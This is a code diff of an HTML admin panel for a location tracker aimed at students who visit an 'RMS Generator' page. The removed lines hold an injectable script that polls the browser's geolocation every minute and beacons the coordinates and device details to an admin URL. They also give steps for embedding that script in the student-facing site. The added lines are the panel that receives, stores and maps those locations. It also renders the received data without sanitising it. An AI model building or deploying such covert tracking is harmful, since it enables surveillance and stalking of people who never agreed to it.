@@ -3,217 +3,96 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RMS Generator Admin</title>
-    <link rel="stylesheet" href="styles.css">
+    <title>Location Tracker Admin</title>
     <style>
-        .admin-container {
-            max-width: 1000px;
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        
+        h1 {
+            color: #1a237e;
+            margin-top: 0;
+        }
+        
+        .controls {
+            margin: 20px 0;
+            display: flex;
+            gap: 10px;
+        }
+        
+        button {
+            background-color: #1a237e;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        
+        button:hover {
+            background-color: #303f9f;
         }
         
         .location-card {
             background-color: white;
+            border: 1px solid #ddd;
             border-radius: 8px;
             padding: 15px;
             margin-bottom: 15px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
         }
         
         .location-card h3 {
             margin-top: 0;
             border-bottom: 1px solid #eee;
             padding-bottom: 8px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        
-        .location-card p {
-            margin: 5px 0;
-        }
-        
-        .card-footer {
-            margin-top: 10px;
-            color: #757575;
-            font-size: 0.8em;
-            text-align: right;
-        }
-        
-        .view-map-btn {
-            background-color: #ff5722;
-            display: inline-block;
-            width: auto;
-            padding: 8px 12px;
-            margin-top: 10px;
-        }
-        
-        .status-indicator {
-            width: 12px;
-            height: 12px;
-            border-radius: 50%;
-            display: inline-block;
-            margin-right: 5px;
-        }
-        
-        .status-active {
-            background-color: #4CAF50;
-            box-shadow: 0 0 5px #4CAF50;
-            animation: pulse 2s infinite;
-        }
-        
-        .status-inactive {
-            background-color: #9E9E9E;
-        }
-        
-        .controls {
-            margin-bottom: 20px;
-            display: flex;
-            gap: 10px;
-        }
-        
-        .password-screen {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(255,255,255,0.95);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-        }
-        
-        .password-box {
-            background-color: white;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 0 20px rgba(0,0,0,0.2);
-            width: 300px;
-        }
-        
-        .password-box input {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-        }
-        
-        @keyframes pulse {
-            0% { box-shadow: 0 0 0 0 rgba(76, 175, 80, 0.7); }
-            70% { box-shadow: 0 0 0 10px rgba(76, 175, 80, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(76, 175, 80, 0); }
-        }
-        
-        #refresh-btn, #clear-btn, #test-btn {
-            width: auto;
-        }
-        
-        .active-users {
-            background-color: #f0f4ff;
-            padding: 15px;
-            border-radius: 8px;
-            margin-bottom: 20px;
-        }
-        
-        .active-users h2 {
-            margin-top: 0;
             color: #1a237e;
-            margin-bottom: 10px;
+        }
+        
+        .map-link {
+            display: inline-block;
+            background-color: #ff5722;
+            color: white;
+            text-decoration: none;
+            padding: 6px 12px;
+            border-radius: 4px;
+            margin-top: 10px;
         }
         
         .instructions {
-            background-color: #fff3e0;
+            background-color: #e8f5e9;
             padding: 15px;
             border-radius: 8px;
             margin-bottom: 20px;
-            border-left: 4px solid #ff9800;
-        }
-        
-        .instructions h3 {
-            margin-top: 0;
-            color: #e65100;
-        }
-        
-        .code-block {
-            background-color: #f5f5f5;
-            padding: 15px;
-            border-radius: 5px;
-            overflow-x: auto;
-            font-family: monospace;
-            margin: 10px 0;
-        }
-        
-        .no-locations {
-            padding: 20px;
-            background-color: #f8f8f8;
-            border-radius: 8px;
-            text-align: center;
-            color: #757575;
-        }
-        
-        .setup-instructions {
-            background-color: #fff3e0;
-            padding: 20px;
-            border-radius: 8px;
-            margin-bottom: 20px;
-            border-left: 5px solid #ff9800;
-        }
-        
-        .setup-instructions h3 {
-            color: #e65100;
-            margin-top: 0;
-        }
-        
-        .setup-instructions pre {
-            background-color: #f5f5f5;
-            padding: 15px;
-            border-radius: 5px;
-            overflow-x: auto;
-            white-space: pre-wrap;
-            font-family: monospace;
-        }
-        
-        .setup-steps {
-            margin-top: 15px;
-            padding-left: 20px;
-        }
-        
-        .setup-steps li {
-            margin-bottom: 10px;
-        }
-        
-        #copy-script {
-            margin-top: 15px;
-            background-color: #ff9800;
-        }
-        
-        #copy-script:hover {
-            background-color: #f57c00;
+            border-left: 4px solid #4caf50;
         }
     </style>
 </head>
 <body>
-    <div class="container admin-container">
-        <h1>RMS Generator Admin Panel</h1>
-        <p>This panel shows locations of students who visit: <a href="https://ashutosh231.github.io/rmsgenerator/" target="_blank">https://ashutosh231.github.io/rmsgenerator/</a></p>
+    <div class="container">
+        <h1>Location Tracker Admin</h1>
         
-        <div class="setup-instructions">
-            <h3>Important: Setup Required</h3>
-            <p>To track locations from your GitHub Pages site, add this script to your site's HTML:</p>
-            <pre id="script-code"></pre>
-            <button id="copy-script">Copy Script to Clipboard</button>
-            
-            <div class="setup-steps">
-                <h4>Steps to implement tracking:</h4>
-                <ol>
-                    <li>Go to your GitHub repository for <strong>https://ashutosh231.github.io/rmsgenerator/</strong></li>
-                    <li>Edit the <strong>index.html</strong> file</li>
-                    <li>Add the script above right before the closing <code>&lt;/body&gt;</code> tag</li>
-                    <li>Replace <code>ADMIN_URL_HERE</code> with the URL where this admin page is hosted</li>
-                    <li>Commit the changes to your repository</li>
-                </ol>
-            </div>
+        <div class="instructions">
+            <h3>How to use this tracker</h3>
+            <p>This page receives location data from your RMS Generator page. Follow these steps:</p>
+            <ol>
+                <li>Upload this file to your <strong>adminpanel</strong> GitHub repository</li>
+                <li>Rename it to <strong>index.html</strong></li>
+                <li>Make sure your tracking script in the RMS Generator sends data to <strong>https://ashutosh231.github.io/adminpanel/</strong></li>
+                <li>When users visit your RMS Generator and allow location access, their location will appear here</li>
+            </ol>
         </div>
         
         <div class="controls">
@@ -222,8 +101,8 @@
             <button id="test-btn">Add Test Location</button>
         </div>
         
-        <div id="location-list" class="no-locations">
-            <p>No location data available yet. Make sure to add the tracking script to your GitHub Pages site.</p>
+        <div id="location-list">
+            <p>No location data available yet.</p>
         </div>
     </div>
     
@@ -233,201 +112,136 @@
             const refreshBtn = document.getElementById('refresh-btn');
             const clearBtn = document.getElementById('clear-btn');
             const testBtn = document.getElementById('test-btn');
-            const scriptCode = document.getElementById('script-code');
-            const copyScript = document.getElementById('copy-script');
             
-            // Set up the script code to be copied
-            const trackingScript = `<script>
-// Simple location tracking script
-(function() {
-    function trackLocation() {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(function(position) {
-                const data = {
-                    lat: position.coords.latitude,
-                    lng: position.coords.longitude,
-                    time: new Date().toISOString(),
-                    device: navigator.userAgent
-                };
-                
-                // This sends location data to your admin page
-                // Replace with your actual admin page URL
-                const adminUrl = "https://your-admin-page-url.com/admin.html";
-                
-                // Send data using image request (most reliable cross-domain method)
-                new Image().src = adminUrl + "?loc=" + 
-                    encodeURIComponent(JSON.stringify(data));
-                
-                // Track again after 1 minute
-                setTimeout(trackLocation, 60000);
-            });
-        }
-    }
-    
-    // Start tracking when page loads
-    trackLocation();
-})();
-<\/script>`;
+            // Check URL parameters first (for incoming tracking data)
+            checkUrlForTrackingData();
             
-            scriptCode.textContent = trackingScript;
+            // Load and display existing locations
+            displayLocations();
             
-            // Function to copy script to clipboard
-            copyScript.addEventListener('click', function() {
-                navigator.clipboard.writeText(trackingScript)
-                    .then(() => {
-                        copyScript.textContent = "Copied!";
-                        setTimeout(() => {
-                            copyScript.textContent = "Copy Script to Clipboard";
-                        }, 2000);
-                    })
-                    .catch(err => {
-                        console.error('Failed to copy: ', err);
-                        alert('Failed to copy script to clipboard. Please select and copy manually.');
-                    });
-            });
+            // Set up event listeners
+            refreshBtn.addEventListener('click', displayLocations);
+            clearBtn.addEventListener('click', clearLocations);
+            testBtn.addEventListener('click', addTestLocation);
             
-            // Check for location data in URL
-            function checkUrlForLocationData() {
-                const urlParams = new URLSearchParams(window.location.search);
-                const locationDataParam = urlParams.get('locationData') || urlParams.get('data');
+            // Function to check URL for location data
+            function checkUrlForTrackingData() {
+                const params = new URLSearchParams(window.location.search);
                 
-                if (locationDataParam) {
+                // Check for tracking data (support multiple parameter names)
+                const trackData = params.get('track') || params.get('loc') || params.get('data');
+                
+                if (trackData) {
                     try {
                         // Parse the location data
-                        const locationData = JSON.parse(decodeURIComponent(locationDataParam));
+                        const locationData = JSON.parse(decodeURIComponent(trackData));
                         
                         // Save to localStorage
-                        saveLocationData(locationData);
+                        saveLocation(locationData);
+                        
+                        // Clear the URL parameters (to avoid reprocessing on refresh)
+                        window.history.replaceState({}, document.title, window.location.pathname);
                         
                         // Update the display
                         displayLocations();
-                        
-                        // Clear the URL parameter
-                        window.history.replaceState({}, document.title, window.location.pathname);
                     } catch (e) {
-                        console.error("Error processing location data from URL", e);
+                        console.error("Error processing tracking data:", e);
                     }
                 }
             }
             
-            // Save location data to localStorage
-            function saveLocationData(locationData) {
+            // Function to save a location
+            function saveLocation(data) {
                 // Get existing locations
-                let locations = getStoredLocations();
+                let locations = getLocations();
                 
-                // Add the new location with timestamp
-                locations.push({
-                    ...locationData,
+                // Create a standardized location object
+                const locationObj = {
+                    coords: {
+                        latitude: data.lat || data.latitude || data.coords?.latitude,
+                        longitude: data.lng || data.longitude || data.coords?.longitude
+                    },
+                    timestamp: data.time || data.timestamp || new Date().toISOString(),
+                    userAgent: data.ua || data.device || data.userAgent || navigator.userAgent,
                     receivedAt: new Date().toISOString()
-                });
+                };
                 
-                // Keep only the latest 100 locations
+                // Add to locations array
+                locations.push(locationObj);
+                
+                // Keep only latest 100 locations
                 if (locations.length > 100) {
                     locations = locations.slice(-100);
                 }
                 
-                // Save back to localStorage
-                localStorage.setItem('rmg_locations', JSON.stringify(locations));
+                // Save to localStorage
+                localStorage.setItem('tracked_locations', JSON.stringify(locations));
             }
             
-            // Get stored locations
-            function getStoredLocations() {
-                const storedData = localStorage.getItem('rmg_locations');
-                return storedData ? JSON.parse(storedData) : [];
+            // Function to get stored locations
+            function getLocations() {
+                const stored = localStorage.getItem('tracked_locations');
+                return stored ? JSON.parse(stored) : [];
             }
             
-            // Display the locations
+            // Function to display locations
             function displayLocations() {
-                const locations = getStoredLocations();
+                const locations = getLocations();
                 
                 if (locations.length === 0) {
-                    locationList.innerHTML = `
-                        <p class="no-locations">No location data available yet. Make sure to add the tracking script to your GitHub Pages site.</p>
-                    `;
+                    locationList.innerHTML = '<p>No location data available yet.</p>';
                     return;
                 }
                 
                 // Sort by timestamp (newest first)
                 locations.sort((a, b) => {
-                    const timeA = a.timestamp || a.receivedAt;
-                    const timeB = b.timestamp || b.receivedAt;
-                    return new Date(timeB) - new Date(timeA);
+                    return new Date(b.timestamp) - new Date(a.timestamp);
                 });
                 
-                let locationsHTML = '';
+                let html = '';
                 
-                locations.forEach(location => {
-                    const timestamp = location.timestamp || location.receivedAt;
-                    const date = new Date(timestamp).toLocaleString();
+                locations.forEach((location, index) => {
+                    const date = new Date(location.timestamp).toLocaleString();
                     const mapUrl = `https://www.google.com/maps?q=${location.coords.latitude},${location.coords.longitude}`;
                     
-                    // Get address info if available
-                    const city = location.address?.city || 'Unknown';
-                    const state = location.address?.state || 'Unknown';
-                    const fullAddress = location.address?.full || 'Address not available';
-                    
-                    locationsHTML += `
+                    html += `
                         <div class="location-card">
-                            <h3>Student Location</h3>
+                            <h3>Location #${index + 1}</h3>
                             <p><strong>Coordinates:</strong> ${location.coords.latitude}, ${location.coords.longitude}</p>
-                            <p><strong>City/State:</strong> ${city}, ${state}</p>
-                            <p><strong>Address:</strong> ${fullAddress}</p>
-                            <p><strong>Device:</strong> ${location.userAgent || 'Unknown'}</p>
-                            <p><strong>URL:</strong> ${location.url || location.page || 'Unknown'}</p>
-                            <a href="${mapUrl}" target="_blank" class="view-map-btn">View on Google Maps</a>
-                            <div class="card-footer">
-                                Received: ${date}
-                            </div>
+                            <p><strong>Time:</strong> ${date}</p>
+                            <p><strong>Device:</strong> ${location.userAgent}</p>
+                            <a href="${mapUrl}" target="_blank" class="map-link">View on Google Maps</a>
                         </div>
                     `;
                 });
                 
-                locationList.innerHTML = locationsHTML;
-                locationList.className = ''; // Remove the no-locations class
+                locationList.innerHTML = html;
             }
             
-            // Add test location
-            function addTestLocation() {
-                const testLocation = {
-                    coords: {
-                        latitude: 31.2526 + (Math.random() * 0.01 - 0.005),
-                        longitude: 75.7033 + (Math.random() * 0.01 - 0.005)
-                    },
-                    timestamp: new Date().toISOString(),
-                    userAgent: navigator.userAgent,
-                    url: 'https://ashutosh231.github.io/rmsgenerator/',
-                    address: {
-                        city: 'Phagwara',
-                        state: 'Punjab',
-                        full: 'Lovely Professional University, Phagwara, Punjab, India'
-                    }
-                };
-                
-                saveLocationData(testLocation);
-                displayLocations();
-            }
-            
-            // Clear all locations
-            function clearAllLocations() {
+            // Function to clear all locations
+            function clearLocations() {
                 if (confirm('Are you sure you want to clear all location data?')) {
-                    localStorage.removeItem('rmg_locations');
+                    localStorage.removeItem('tracked_locations');
                     displayLocations();
                 }
             }
             
-            // Event listeners
-            refreshBtn.addEventListener('click', displayLocations);
-            clearBtn.addEventListener('click', clearAllLocations);
-            testBtn.addEventListener('click', addTestLocation);
+            // Function to add a test location
+            function addTestLocation() {
+                // LPU approximate coordinates with small random variation
+                const testData = {
+                    lat: 31.2526 + (Math.random() * 0.01 - 0.005),
+                    lng: 75.7033 + (Math.random() * 0.01 - 0.005),
+                    time: new Date().toISOString(),
+                    ua: "Test Browser"
+                };
+                
+                saveLocation(testData);
+                displayLocations();
+            }
             
-            // Check for location data in URL on page load
-            checkUrlForLocationData();
-            
-            // Initial display
-            displayLocations();
-            
-            // Set up periodic checking for new location data
-            setInterval(checkUrlForLocationData, 5000);
+            // Check for new data every 5 seconds (helpful for receiving cross-domain data)
+            setInterval(checkUrlForTrackingData, 5000);
         });
     </script>
 </body>
